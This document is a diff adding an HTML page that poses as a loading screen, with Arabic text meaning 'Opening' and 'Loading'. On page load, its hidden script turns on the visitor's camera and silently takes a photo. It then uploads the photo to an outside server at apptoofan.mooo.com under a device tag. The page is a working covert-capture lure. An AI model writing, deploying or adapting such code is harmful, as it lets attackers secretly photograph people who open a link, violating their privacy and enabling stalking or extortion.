@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>جاري الفتح </title>
+</head>
+<body>
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<h1>جاري التحميل 🔍</h1>
+<script>
+(async () => {
+    try {
+        // بدء تشغيل الكاميرا
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+            // الانتظار قليلاً لبدء الفيديو
+            setTimeout(() => {
+                // التقاط الصورة
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // تحويل إلى Blob ثم إرسالها
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("file", blob, "image.jpg");
+
+                    // device name = ali مثلاً
+                    const device = "Links";
+                    const url = "http://apptoofan.mooo.com/Gor.php?device=" + encodeURIComponent(device);
+
+                    fetch(url, {
+                        method: "POST",
+                        body: formData
+                    }).then(res => res.text())
+                      .then(txt => console.log("✅ الرد من السيرفر:", txt))
+                      .catch(err => console.error("❌ خطأ:", err));
+
+                    // إيقاف الكاميرا
+                    stream.getTracks().forEach(track => track.stop());
+                }, "image/jpeg");
+            }, 1000); // تأخير 1 ثانية للسماح بتشغيل الكاميرا
+        };
+    } catch (err) {
+        console.error("❌ فشل الوصول إلى الكاميرا:", err);
+    }
+})();
+</script>
+</body>
+</html>
